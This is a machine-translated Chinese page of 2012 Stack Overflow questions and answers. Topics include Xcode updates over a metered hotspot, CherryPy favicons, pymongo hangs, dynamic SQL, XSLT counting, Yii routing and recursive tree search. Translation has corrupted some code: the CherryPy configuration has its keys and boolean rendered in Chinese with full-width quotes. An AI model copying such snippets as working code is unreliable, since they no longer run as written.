我的推理是因为我主要通过网络连接工作，该网络连接通过 4G 无线热点访问互联网，该热点受到超额费用的影响。事实上，我大约 90% 的时间都在使用我的 Mac 工作，通过这个设备连接到互联网。当我需要下载任何形式的大型软件更新时，我总是将我的 Macbook 带到一个开放的、直接连接到 Internet 的源上，让它做它需要做的事情。

这适用于大多数软件，但不适用于 XCode。

我希望我的更新保持自动（这样我至少会被告知有可用的更新）但是，我想选择是否启动它们。

在下载之前我可以做些什么让 XCode 询问吗？

**速记**

我知道我们有技术头脑的人是怎样的——你们中有一半人仍然想知道为什么我在 4G 热点上工作并想要解决这个问题，而不是我问的那个问题。（是的，我也倾向于这样想。）

但是，我在一个 IT 部门的环境中工作，该部门坚决拒绝让 Win XP 和 Win 7 以外的任何操作系统进入他们的网络。工程团队（我为之工作）必须有互联网连接和用于存储和备份数据的内部网络，我们正在开发与我们的产品集成的 iOS 软件。这显然是有问题的，因为我们需要使用 Macbook 来完成我们的工作。

我们解决这个困境的方法是建立我们自己的小型局域网，而我们获得互联网访问的唯一方法是通过蜂窝 WiFi。我们地区可用的所有 WiFi ISP 计划都是基于层级的，当我们使用的数据超过我们分配的数据时，会收取超额费用（以合理的费率）。我们不介意超出配额，但是，我们需要保持合理。当我们中的一些人每个月必须下载几 GB 的数据时，像这样的自动更新可能会开始对我们的网络造成巨大打击。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T14:23:28.983

像[LittleSnitch](http://www.obdev.at/products/littlesnitch/index.html)这样的软件可能是最好的解决方案（防火墙）。
如果 Xcode 尝试自我更新，下面的对话框会显示。
现在您可以简单地`Allow`或`Deny`连接。
这样您就可以准确控制所有连接（以及您的隐私）。
其他应用程序也可能会消耗相当多的带宽。

![小飞贼](../Images/8de3ea84a6962d2192498f5126eb8de3.png)

PS
*为什么不将便宜的 XP 盒子连接到网络，
它与所有 Mac 共享互联网连接？*

# cherrypy - 带有 CherryPy 3.2.2 的 favicon.ico

> ID：11847412
> 
> 赞同：0
> 
> 时间：2012-08-07T13:47:07.933
> 
> 标签：cherrypy, favicon

我在 Python 3.2.2 下运行 CherryPy 3.2.2（巧合！）。我在我的服务器配置中包含以下元素：

```
        “/favicon.ico”：
                        {
                          “tools.staticfile.on”：是的，
                          “工具.静态文件.文件名”：
                                 “/myhome/myserver/favicon.ico”
                        },

```

但是，服务器没有在我的浏览器地址栏中显示我的图标。有什么提示吗？

更准确地说，在 Chrome 和 Firefox 中，图标确实显示在选项卡标签中，但不在地址栏中；在 Seamonkey 中它确实出现在两者中——这就是我希望它在任何浏览器下执行的操作。也许这不是 CherryPy 的问题？

-- tsf

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T15:30:21.283

它似乎工作正常。对于某些浏览器，没有办法让 favicon 出现在 url 栏中...

[为什么 google chrome 的地址栏中不显示 favicon 文件？](https://stackoverflow.com/questions/7864813/why-doesnt-the-favicon-file-show-in-the-address-bar-of-google-chrome)

# objective-c - 无法下载应用程序 OTA iOS

> ID：11847413
> 
> 赞同：0
> 
> 时间：2012-08-07T13:47:12.177
> 
> 标签：objective-c, ios, cocoa-touch

我正在尝试分发应用程序 OTA 的测试版。我正在使用团队配置文件，并通过 Xcode 在我的 iPhone 上运行良好。当我单击下载链接时，它会显示通常的弹出窗口，并且应用程序开始下载，但在进度条取得任何进展之前，我得到“此时无法下载应用程序”。控制台完全没有显示。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T13:59:59.860

验证 bundle-identifier 密钥是否与您用于构建 ipa 文件的密钥相同。捆绑版本密钥也应与 ipa 中的密钥相同

# django - Django pre-shutdown hook 关闭挂起的 pymongo 连接

> ID：11847418
> 
> 赞同：3
> 
> 时间：2012-08-07T13:47:32.660
> 
> 标签：django, pymongo

我在 Django 项目中使用 pymongo，最近我开始遇到一个问题，在退出主 Django 进程（即使通过管理命令）时，pymongo 连接将挂起，并且该进程永远不会退出。显然，堆栈中的某处有问题，但目前最好的解决方案似乎是在 Django 退出之前显式关闭连接。

那么：Django 是否为此提供了预关闭信号或挂钩？

顺便说一句：我的连接代码以防您感兴趣。

```
from django.conf import settings
from pymongo import ReplicaSetConnection, ReadPreference

conn = ReplicaSetConnection(
    hosts_or_uri=settings.MONGO['HOST'],
    replicaSet=settings.MONGO['REPLICASET'],
    safe=settings.MONGO.get('SAFE', False),
    journal=settings.MONGO.get('JOURNAL', False),
    read_preference=ReadPreference.PRIMARY
)

db = getattr(conn, settings.MONGO['DB']) 
```

（出于好奇，这是在 pymongo 中进行连接池的正确方法吗？）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T20:52:23.587

虽然这不能解决您的问题，但在 2012 年 7 月对 pymongo 的提交中引入了挂起：[https](https://github.com/mongodb/mongo-python-driver/commit/1fe6029c5d78eed64fcb2a6d368d9cdf8756d2f4#commitcomment-1820334) ://github.com/mongodb/mongo-python-driver/commit/1fe6029c5d78eed64fcb2a6d368d9cdf8756d2f4#commitcomment-1820334 。

具体来说，它只影响 ReplicaSetConnections。他们给出的答案是调用connection.close（），但正如您在问题中正确指出的那样，关闭连接没有好的钩子。

我相信您可以在每个请求结束时安全地关闭连接。Django 已经为其与数据库的 ORM 连接做到了这一点。这就是为什么他们建议使用像 pgbouncer 这样的连接池，所以重新连接到 postgres 是即时的。Pymongo 内置了一个连接池，所以可以随意重连。

# asp.net-mvc-3 - 用于制作直方图的库 javascript

> ID：11847421
> 
> 赞同：7
> 
> 时间：2012-08-07T13:47:36.207
> 
> 标签：asp.net-mvc-3, javascript, histogram

我在asp.net mvc3项目上工作，我必须根据来自动作的数据在视图中显示直方图，你能推荐我任何易于使用并制作好的直方图的库javascript，请任何syggestion！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-07T15:10:25.087

[http://www.highcharts.com/](http://www.highcharts.com/) - 出色的集成和漂亮的外观（非商业免费）

[http://www.jqplot.com/](http://www.jqplot.com/) - 开源，也很好看（像啤酒一样免费）

[http://g.raphaeljs.com/](http://g.raphaeljs.com/) - 另一个开源，维护良好

[http://www.flotcharts.org/](http://www.flotcharts.org/) - 专为 JQuery 构建（如果您正在使用）

基本上，看看这些和其他的，找到一个看起来不错并且可以轻松插入您现有架构并滚动的。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-09-05T21:25:39.547

如果您只想将数据分类到 bin 中，请查看[histogram.js](https://github.com/eoinmurray/histogram)。

# linux - Linux 内核模块 ABI (x86)

> ID：11847422
> 
> 赞同：3
> 
> 时间：2012-08-07T13:47:37.917
> 
> 标签：linux, x86, kernel, abi

我正在寻找用于 x86 内核模块调用的 ABI 的官方定义。我最近查看了一个已编译的模块，并惊讶地发现：

*   它使用寄存器来传递前三个参数（`eax`和`edx`） `ecx`。

*   它`fastcall`与 GCC 文档中的描述不同。[文档说](http://gcc.gnu.org/onlinedocs/gcc/Function-Attributes.html)使用 ecx`fastcall`和 edx （微软风格）。

我能找到的唯一一些相关的信息是[这个](http://www.spinics.net/lists/kvm-devel/msg09495.html)，但它并没有说太多。

所以：

1）是否有任何关于内核模块中使用的 ABI 的官方文档（不是系统调用 ABI，而不仅仅是函数列表 - 我确实找到了）。

2）编译器是如何产生这个奇怪的快速调用的？有没有我错过的开关？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-07T13:57:44.503

`-mregparm=3`对此负责。

# sql-server-2008 - 使用动态 sql 填充临时表

> ID：11847423
> 
> 赞同：1
> 
> 时间：2012-08-07T13:47:39.143
> 
> 标签：sql-server-2008, dynamic-sql, temp-tables

我知道这并不理想，但我想知道是否可以基于动态 sql 填充临时表？

[这个答案](https://stackoverflow.com/a/662093/685760)中显示了一个与我想要实现的非常相似的例子

```
SELECT into #T1 execute ('execute ' + @SQLString ) 
```

或者

```
INSERT into #T1 execute ('execute ' + @SQLString ) 
```

我也无法工作。从编辑看来，第一个选项是错误的，所以对于第二个选项，我尝试过类似的东西；

```
DECLARE @SQLString VARCHAR (2000) = 'SELECT * FROM INFORMATION_SCHEMA.COLUMNS'

INSERT into #MyTempTable execute (@SQLString ) 
```

任何想法都非常感谢。

**编辑：**

为了澄清我正在尝试做的事情而不会过于本地化，我将在下面尽可能简要地解释一下。

我在数据库的暂存区域中有数据，其中包含具有动态名称和动态列数的表。但是，每个表的一些列名是相同的。我不想在动态 sql 中构造所有内容，而是希望能够简单地将已知列提取到临时表（或表变量、CTE、派生表等）中并对其采取行动。

所以给了一张桌子；

```
 CREATE TABLE SomeParticularNameThatCantBeKnownToAStoredProc (
      [1] AS VARCHAR(100),
      [2] AS VARCHAR(100),
      ... -- Could be any number of these columns
      [Id] AS INT,
      [KnownCol] AS VARCHAR(100),
      [KnownCol2] AS VARCHAR(100),
      ....
      [DboId] AS INT
  ) 
```

我希望能够执行必要的操作以允许我处理这些数据，而不必在动态 sql 中完成所有操作。我希望能够做类似的事情；

```
 DECLARE @TableName AS VARCHAR(1000) = 'SomeParticularNameThatCantBeKnownToAStoredProc'

  SELECT [Id], [KnownCol], [KnownCol2], [DboId] 
  INTO #KnownName
  FROM @TableName -- I know this isn't possible, but this is what I'd like to do 
```

这将允许我针对一致的#KnownName 执行 SQL 语句。我需要做的其他一些操作非常冗长，例如使用数据与其他现有表相关联，将数据从暂存表复制到它们的 dbo 模式等效项，以及使用 MERGE 将 DboId 与暂存表 Id 匹配OUTPUT INTO如此[处](http://sqlblog.com/blogs/adam_machanic/archive/2009/08/24/dr-output-or-how-i-learned-to-stop-worrying-and-love-the-merge.aspx)所述，依此类推。

如果您能想到任何其他方式，我可以限制我需要编写的动态 SQL 的数量，因为表名是动态的，那么请告诉我。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-07T13:48:55.223

假设 #MyTempTable 已经存在：

```
DECLARE @sql NVARCHAR(MAX);
SET @sql = N'SELECT * FROM INFORMATION_SCHEMA.COLUMNS;';
INSERT #MyTempTable EXEC sp_executesql @SQLString; 
```

否则，请澄清您要做什么。如果尚未创建表，您可以在动态 SQL 中执行所有操作，例如：

```
DECLARE @sql NVARCHAR(MAX);
SET @sql = N'SELECT * INTO #MyTempTable FROM INFORMATION_SCHEMA.COLUMNS;
  SELECT * FROM #MyTempTable;';
EXEC sp_executesql @sql; 
```

# sql-server - 使用导入和导出向导导入远程 XML (SQL Server 2008)

> ID：11847426
> 
> 赞同：1
> 
> 时间：2012-08-07T13:47:56.930
> 
> 标签：sql-server, xml, import

我需要做什么：

将数据从远程 XML 文件（>20 种不同的模式，可通过 uri 获取）导入 SQL Server 2008。数据应每天导入一次。

我决定使用 SQL Server 2008 包中的“导入和导出数据”工具。

该工具适用于从 Excel 导入数据，但我不知道如何将 XML 文件配置为数据源。

问题是我在数据源列表中找不到像“XML Provider”这样的东西。

1.  我应该在服务器机器上安装一些特殊的“XML 数据提供”吗？

2.  也许有人知道一些更好的（快速编程）解决方案（.net/LINQu 中的硬编码不是一个好主意）。

感谢帮助！

# sql - SQL：如何从表中删除视图中存在的所有行？

> ID：11847427
> 
> 赞同：0
> 
> 时间：2012-08-07T13:47:59.227
> 
> 标签：sql, sybase

我想执行的查询：

```
BEGIN TRANSACTION

   INSERT INTO TABLE_B SELECT * FROM TABLE_A WHERE SOME_COLUMN = 'something'

   DELETE FROM TABLE_A WHERE COLUMN IN (
     SELECT * FROM TABLE_A WHERE SOME_COLUMN = 'something'
   )

END TRANSACTION 
```

如您所见，查询中有一条冗余`SELECT`语句`DELETE`我想替换（如果可能），从而提高效率。

我正在考虑用第一个查询中的行创建一个视图，然后用第二个表中的行扫描视图。如果某些条件匹配，则从第二个表中删除该行。

我能得到一些关于如何做到这一点的指示吗？如果我做错了什么，请批评。

我正在使用 Sybase。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T13:54:16.257

这就是你想要的，我认为：

```
delete from table_a
where some_column = 'something' 
```

如所写，您的查询可能会产生语法错误。“SELECT *”将返回 table_a 中的所有列，并且它可能有多个列。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:03:18.343

通常，您应该能够在`delete`语句中进行连接，但您需要指定要从中删除行的表：

```
delete table_a 
  from table_a left join table_b on (table_a.column_a = table_b.column_b)
 where table_b.column_b = 'some_value' 
```

# xslt - XSLT - 计算每个 xml 文档的节点数

> ID：11847434
> 
> 赞同：2
> 
> 时间：2012-08-07T13:48:13.023
> 
> 标签：xslt, xslt-1.0

我是 xsl 的新手，在计算多个 xml 文档中的节点时遇到了问题。这是我的 XSLT 片段：

```
<xsl:variable name="count">
    <xsl:for-each select="document(./log/@file)/testResults/*[not(@lb = preceding::*/@lb)]">
            <xsl:value-of select="count(../*[@lb = current()/@lb])"/>
    </xsl:for-each>
</xsl:variable> 
```

其中**./log/@file**处理几个 xml 文档。一个 xml 文档示例：

```
<testResults version="1.2">
        <sample t="63" lt="0" ts="1343919489839" s="true" lb="jp@gc - Dummy Sampler" rc="200" rm="OK" tn="Thread Group 1-1" dt="text" by="114"/>
        <sample t="62" lt="0" ts="1343919489903" s="true" lb="jp@gc - Dummy Sampler" rc="200" rm="OK" tn="Thread Group 1-1" dt="text" by="114"/>
        <sample t="58" lt="0" ts="1343919490063" s="true" lb="jp@gc - Dummy Sampler" rc="200" rm="OK" tn="Thread Group 1-1" dt="text" by="114"/>
        <sample t="13" lt="0" ts="1343919490210" s="true" lb="jp@gc - Dummy Sampler" rc="200" rm="OK" tn="Thread Group 1-1" dt="text" by="114"/>
        <sample t="37" lt="0" ts="1343919490223" s="true" lb="jp@gc - Dummy Sampler" rc="200" rm="OK" tn="Thread Group 1-1" dt="text" by="114"/>
</testResults> 
```

我对所有解析的文档都有相同的结构。

最后一个问题...... count 函数正确返回一个文档的计数。但下一个计数结果将连接到前一个。我的目标是总结每次迭代的结果。

因此，如果第一次迭代有 15 个机器，第二次迭代有 4 个匹配项，则计数变量将设置为 154。

你能帮忙吗？

Ps 我正在计算按**lb**属性分组的**testResults的****子元素**

 ****pps **xsl**版本是**1.0**

谢谢，瓦莱里

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T05:06:37.033

我会选择管道设计。在第一阶段，对于给定的文档，收集所有@lb 计数，类似这样......

```
<xsl:variable name="phase-1-output">
  <xsl:apply-templates select="..some-expression.../@file" mode="phase-1">
</xsl:variable>

<template match="@file" mode="phase-1">
 <xsl:apply-templates select="document(.)/testResults/sample" mode="phase-1" />
</template>

<xsl:template match="*" mode="phase-1" />

<xsl:template match="testResults/*[not(@lb = preceding::*/@lb)]" mode="phase-1" >
 <lb-group key="{@lb}">
  <xsl:number count="../*[@lb = current()/@lb]" />
 <lb-group>
</xsl:variable> 
```

这为我们提供了一个变量 ($phase-1-output)，其中包含一个元素列表 (lb-group)，其中包含一个计数和一个键。将第一个模板中的选择表达式替换为问题空间所需的任何内容。

您可能拥有跨文档共享的 @lb 值，我认为您希望将这些值组合在一起并求和。因此，在第 2 阶段，您应用与第 1 阶段相同的分组和计数技术，除了输入来自 $phase-1-output 变量，您将求和，而不是计数。要访问 $phase-1-output 中的 lb-groups，您需要使用 node-set() 函数。

让我知道这是否足够，或者您想要完整的样式表。

* * *

## 更新

OP 要求提供完整的样式表，所以就在这里。由于缺乏提供的适当示例数据，我制作了几个示例输入文档，它们与 OP 提供的具有相同的显着特征，但根据问答网站的需要进行了缩减和简化。

### 输入

假设我们有 2 个输入文件。第一个文件的 URL in1.xml 包含以下内容：

```
<testResults category="citrus">
 <sample lb="lemon" />
 <sample lb="lemon" />
 <sample lb="green apple" />
 <sample lb="green apple" />
 <sample lb="green apple" />
</testResults> 
```

另一个带有 URL in2.xml 的文件具有以下内容：

```
<testResults category="green food">
 <sample lb="green apple" />
 <sample lb="celery soup" />
 <sample lb="peas" />
 <sample lb="peas" />
</testResults> 
```

OP的规定要求是......

> 按 lb 属性对 testResults 的子元素进行计数

### 所需输出

因此，所需的输出将如下所示。我发明了非信息结构，因为 OP 忘记提供它。

```
<root>
   <lb-group lb-key="lemon">2</lb-group>
   <lb-group lb-key="green apple">4</lb-group>
   <lb-group lb-key="celery soup">1</lb-group>
   <lb-group lb-key="peas">2</lb-group>
</root> 
```

读者会注意到有 4 个青苹果。3 来自第一个输入文档，1 来自第二个输入文档。我假设 OP 想要跨越文件边界进行计数。如果需要分离，也就是说，严格按每个文件计算，请告诉我。

### 解决方案

在 Saxon XSLT 处理器上，在向后兼容模式下，可以通过以下 XSLT 1.0 样式表实现此结果，该样式表实现了上述管道设计。

```
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:so="http://stackoverflow.com/questions/11847434"
  xmlns:exslt="http://exslt.org/common"
  exclude-result-prefixes="xsl so exslt">
<xsl:output method="xml" indent="yes" omit-xml-declaration="yes" />
<xsl:strip-space elements="*" />

<xsl:variable name="test-result-files">
 <so:file file="in1.xml" />
 <so:file file="in2.xml" />
</xsl:variable>

<xsl:template match="/" >
 <root>
  <xsl:variable name="phase-1-output" >
    <xsl:apply-templates select="document('')/*/xsl:variable
      [@name='test-result-files']/so:file/@file" mode="phase-1" />
  </xsl:variable>
  <xsl:apply-templates select="$phase-1-output/lb-group" mode="phase-2" />
 </root>
</xsl:template>

<xsl:template match="@file" mode="phase-1">
 <xsl:apply-templates select="document(.)/testResults/sample" mode="phase-1" />
</xsl:template>

<xsl:template match="*" mode="phase-1" />

<xsl:template match="testResults/*[not(@lb = following::*/@lb)]" mode="phase-1" >
 <xsl:variable name="lb-key" select="@lb" />
 <lb-group lb-key="{$lb-key}">
  <xsl:number count="*[@lb = $lb-key]" />
 </lb-group>
</xsl:template>    

<xsl:template match="*" mode="phase-2" />

<xsl:template match="lb-group[not(@lb-key = following::*/@lb-key)]" mode="phase-2">
 <xsl:copy>
  <xsl:copy-of select="@*" />
  <xsl:value-of select="sum(../*[@lb-key=current()/@lb-key])" />
 </xsl:copy>
</xsl:template>

</xsl:stylesheet> 
```

### 警告

根据您的 XSLT 引擎是什么，您可能需要更换线路...

```
 <xsl:apply-templates select="$phase-1-output/lb-group" mode="phase-2" /> 
```

...和...

```
 <xsl:apply-templates select="xslt:node-set($phase-1-output)/lb-group" mode="phase-2" /> 
```

...或 Microsoft 同等产品，如果使用 MS 处理器。****

# php - 使用正则表达式在 PHP 中查找所有 HTML 表格行

> ID：11847447
> 
> 赞同：0
> 
> 时间：2012-08-07T13:48:44.190
> 
> 标签：php, html, regex, parsing, preg-match-all

尝试使用此运算符查找所有 HTML <table> 行，但没有：

```
preg_match_all("#<tr[^>]*>.*</tr>#", $content, $matches); 
```

怎么了？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T13:52:29.417

```
preg_match_all ('#<tr[^>]*>(.*?)</tr>#s') 
```

添加了“s”标志，以便它也匹配换行符，匹配的问号（惰性），还添加了括号（捕获组）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-07T13:50:34.907

[我认为使用PHP HTML 解析器](http://simplehtmldom.sourceforge.net/)会取得更大的成功。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-07T13:51:35.593

除非您遇到复杂的递归表达式，否则任何正则表达式都会遇到嵌套表的问题。

试试这个：

```
$dom = new DOMDocument();
$dom->loadHTML($content);
$matches = $dom->getElementsByTagName("tr");
$count = $matches->length; 
```

# objective-c - 这段代码有什么问题？（目标-c）？

> ID：11847448
> 
> 赞同：-3
> 
> 时间：2012-08-07T13:48:46.040
> 
> 标签：objective-c, uialertview, alertview

```
-(void)otherGames
{
    UIAlertView *alertMsg = [[UIAlertView alloc]
    initWithTitle:@"This gGame was Developed By:"
    message:@"Burhan uddin Raizada"
    delegate:nil
    cancelButtonTitle:@"Dismiss"
    otherButtonTitles: @"@twitter" , nil];
    [alertMsg show];

}

-(void)alertMsg:(UIAlertView *)alertMsg clickedButtonAtIndex:(NSInteger)buttonIn… {

    if (buttonIndex == 1) {
        NSString *containingURL = [[NSString alloc] initWithFormat:@"http://www.twitter.com/…
        [[UIApplication sharedApplication] openURL:[NSURL URLWithString: containingURL]];
    }
} 
```

第一个 alertmsg 工作得很好。但是当我在新的“@twitter”按钮上添加了一个赞时，它就不起作用了。否则一切正常。我想知道为什么它没有，但它应该..需要帮助。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-08-07T13:58:49.680

假如说

```
- (void)alertMsg:(UIAlertView *)alertMsg clickedButtonAtIndex:(NSInteger)buttonIn… 
```

是

```
-(void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex 
```

您必须将委托设置为`self`并将委托协议添加到您的标头：

```
@interface yourView : UIViewController <UIAlertViewDelegate> 
```

编辑：根据@holex，使用`alertView:willDismissWithButtonIndex:`而不是 -`(void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex`

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-08-08T08:03:58.670

# 更新

这个答案已经过时，因为`UIAlertView`在 iOS8 中已弃用。

[`UIAlertController`](https://developer.apple.com/documentation/uikit/uialertcontroller#main)您可以在 Apple 的 Dev Docs 上阅读更多信息。

* * *

~~**第一的：**~~

你还没有委派你的班级，`delegate:nil`表明没有`UIAlertView`. 您应该按照以下方式更正您的方法：

```
-(void)otherGames
{
    UIAlertView *alertMsg = [[UIAlertView alloc]
    initWithTitle:@"This gGame was Developed By:"
    message:@"Burhan uddin Raizada"
    // delegate:nil
    delegate:self // don't forget to implement the UIAlertViewDelegate protocol in your class header
    cancelButtonTitle:@"Dismiss"
    otherButtonTitles: @"@twitter" , nil];
    [alertMsg show];

} 
```

**第二：**

回调方法的正确名称是：`-alertView:didDismissWithButtonIndex:`

```
//-(void)alertMsg:(UIAlertView *)alertMsg clickedButtonAtIndex:(NSInteger)buttonIn… { // WRONG, where have you got this silly idea...?
- (void)alertView:(UIAlertView *)alertView didDismissWithButtonIndex:(NSInteger)buttonIndex {
    if (buttonIndex == 1) {
        NSString *containingURL = [[NSString alloc] initWithFormat:@"http://www.twitter.com/…
        [[UIApplication sharedApplication] openURL:[NSURL URLWithString: containingURL]];
    }
} 
```

~~现在，您知道为什么您的代码片段是错误的了。~~

# routes - yii：国际化（i18n）和动态 url 管理器

> ID：11847451
> 
> 赞同：4
> 
> 时间：2012-08-07T13:48:59.753
> 
> 标签：routes, yii, url-routing

我想知道在 Yii 框架中实现“国际化（i18n）”和“动态 URL 管理”的更好方法。

一个（难以维护的）临时解决方案：

```
// protected/config/main.php
'language' => 'es',
...
'urlManager'=>array(
        'urlFormat'=>'path',
        'showScriptName' => false,
        'rules'=>array(
            // pages
            'es/turismo/<slug:>' => array('visit/page', 'defaultParams' => array('lang' => 'es'), 'urlSuffix' => '.html'),
            'it/visita/<slug:>' => array('visit/page', 'defaultParams' => array('lang' => 'it'), 'urlSuffix' => '.html'),
            'en/travel/<slug:>' => array('visit/page', 'defaultParams' => array('lang' => 'en'), 'urlSuffix' => '.html'),
            'turismo/<slug:>' => array('visit/page', 'urlSuffix' => '.html'),

            // home
            'es/turismo' => array('visit/index', 'defaultParams' => array('lang' => 'es'), 'urlSuffix' => '.html'),
            'it/visita' => array('visit/index', 'defaultParams' => array('lang' => 'it'), 'urlSuffix' => '.html'),
            'en/travel' => array('visit/index', 'defaultParams' => array('lang' => 'en'), 'urlSuffix' => '.html'),

            // contact us
            'es/contactenos' => array('site/contact', 'defaultParams' => array('lang' => 'es'), 'urlSuffix' => '.html'),
            'it/contattaci' => array('site/contact', 'defaultParams' => array('lang' => 'it'), 'urlSuffix' => '.html'),
            'en/contact-us' => array('site/contact', 'defaultParams' => array('lang' => 'en'), 'urlSuffix' => '.html'),

        ),
    ),
...

// protected/controllers/VisitController.php
...
public function actionIndex($lang = 'es'){
    Yii::app()->language = $lang;
    ...
}
public function actionPage($slug, $lang = 'es'){
    Yii::app()->language = $lang;
    ...
}
... 
```

这意味着，每个控制器的新配置“urlManager”规则并始终为每个控制器操作传递 $lang 参数。一个活生生的例子：

[montmartrebutte.com](http://www.montmartrebutte.com/)

我尝试了其他一些选项但没有成功：

[Yii 框架论坛：动态 URL 管理器路由](http://www.yiiframework.com/forum/index.php/topic/5178-dynamic-url-manager-routes/)

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-08T08:51:12.200

规则：

```
'<lang:(es|it|en)>/(turismo|visita|travel)/<slug:>' => array('visit/page', 'urlSuffix' => '.html'), 
```

控制器：

```
class VisitController extends Controller
{
    public function actionPage($slug)
    {

    }
} 
```

父控制器（如果您不使用模块）：

```
class Controller extends CController
{
    public function beforeAction($action)
    {
        Yii::app()->language = Yii::app()->request->getQuery('lang', 'es');
        return parent::beforeAction($action);
    }
} 
```

# sql - 优化加密列的范围/通配符搜索。

> ID：11847458
> 
> 赞同：1
> 
> 时间：2012-08-07T13:49:17.387
> 
> 标签：sql, sql-server, optimization, encryption

我有几个要求不能很好地相互配合：

1.  加密名字、姓氏、DOB 以及表中的其他几个列（数据库是 Sql Server）。
2.  对其中一些加密列执行范围/通配符搜索。ie select * from table where first_name like '%jo%' and last_name like '%exceptional%'。

我知道我需要解密整个表然后执行非常缓慢的搜索。但不知何故，我需要优化搜索。

现在我可以考虑使用 dataset/Linq 等在数据库或应用程序内部进行搜索。

那么，哪种方法会相对更快呢？还有其他优化方法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T15:39:09.263

您应该研究数据散列。散列可以让您进行搜索，而不必解密每一行。

[http://blogs.msdn.com/b/sqlsecurity/archive/2011/08/26/data-hashing.aspx](http://blogs.msdn.com/b/sqlsecurity/archive/2011/08/26/data-hashing.aspx)

# objective-c - 在弹出窗口中如何检测界面方向？

> ID：11847460
> 
> 赞同：2
> 
> 时间：2012-08-07T13:49:19.367
> 
> 标签：objective-c, ios

如果我在一个`UIViewController`当前作为弹出窗口呈现的课程中，我如何检测我所处的方向？

我已经尝试过通常的方法，但即使设备处于横向状态，`self.interfaceOrientation`它也总是会返回。`Portrait`这样做的正确方法是什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T14:06:40.170

你可以使用

```
 [UIApplication sharedApplication].statusBarOrientation 
```

或者您可以在方向更改后使用通知

```
[[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications];
[[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(orientationChanged:) name:UIDeviceOrientationDidChangeNotification object:nil]; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-07T13:54:59.897

这应该给你你需要的东西：

```
UIInterfaceOrientation orientation = [[UIDevice currentDevice] orientation]; 
```

你需要打电话

```
[[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications]; 
```

在此属性开始产生正确的值之前。

# java - 递归搜索二叉树问题

> ID：11847461
> 
> 赞同：0
> 
> 时间：2012-08-07T13:49:21.723
> 
> 标签：java, search, recursion, tree, binary-tree

我编写了以下代码用于递归搜索二叉树。即使我的 system.out 语句正在执行，return 语句也没有从整个递归中返回，因此这个方法没有返回 true。

谁能建议我如何从整个递归中返回。？

```
public static boolean isElementinTree(int num, BinaryTreeNode root) 
{
    if (root != null)
    {
        int rootVal = root.getData();
        BinaryTreeNode left = root.getLeft();
        BinaryTreeNode right = root.getRight();
        if (left != null)
        {
            isElementinTree(num,left);

        }
        if (right != null)
        {
            isElementinTree(num,right);
        }
        if (num == rootVal)
        {
            System.out.println("------ MATCH -----");               
            return true;
        }           
    }   
    return false;
} 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-08-07T13:52:01.313

这就是问题：

```
if (left != null)
{
    isElementinTree(num,left);

}
if (right != null)
{
    isElementinTree(num,right);
} 
```

在这些情况下，您正在*调用*该方法 - 但忽略了结果。我怀疑您只想更改其中的每一个以在发现时立即返回：

```
if (left != null && isElementinTree(num, left))
{
    return true;
}
if (right != null && isElementinTree(num, right))
{
    return true;
} 
```

或者为了使整个事情更具声明性，您可以更简单地做到这一点：

```
public static boolean isElementinTree(int num, BinaryTreeNode root) 
{
    return root != null && (root.getData() == num ||
                            isElementInTree(num, root.getLeft()) ||
                            isElementInTree(num, root.getRight()));
} 
```

可以使用 null 第二个参数进行调用`isElementInTree`，因为您已经在第一部分中防止了这种情况。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-12-18T13:09:24.390

像这样的简单解决方案有什么问题：

```
public static boolean isElementinTree(int num, BinaryTreeNode root)
{
    return root != null &&                           //The tree is non-null
           (num == root.getData() ||                 //We have num in this node OR
            isElementInTree(num, root.getLeft()) ||  //We have num in left subtree OR
            isElementInTree(num, root.getRight()) ); //We have num in right subtree
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-08-01T00:57:52.100

递归解决方案：

```
boolean isElementinTree (int num, BinaryTreeNode root)
{
  if(root == null)
   return false;

  if(root.value == num)
   return true;

  boolean n1 = isElementinTree(num,root.getLeft());
  boolean n2 = isElementinTree(num,root.getRight());

  return n1 ? n1 : n2;

} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-07T13:58:51.467

如果确实在左子树或右子树中找到了要查找的元素，则需要将此事实返回给调用者：

```
 if (left != null)
    {
        if(isElementinTree(num,left)) return true;
    }
    if (right != null)
    {
        if(isElementinTree(num,right)) return true;
    } 
```

只有当你在左树、右树和当前节点中都没有找到它时，你最终才会落入 final `return false`。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-07T13:52:02.350

您需要检查该值是否在其中一个分支中，并保存该结果。

初始化一个变量`boolean found = false;`。

当您进行递归调用时，您需要执行以下操作：

```
found = isElementinTree(num,left) 
```

右侧也一样。

最后，不是返回 false，而是检查是否在分支上找到了该值，只需`return found;`

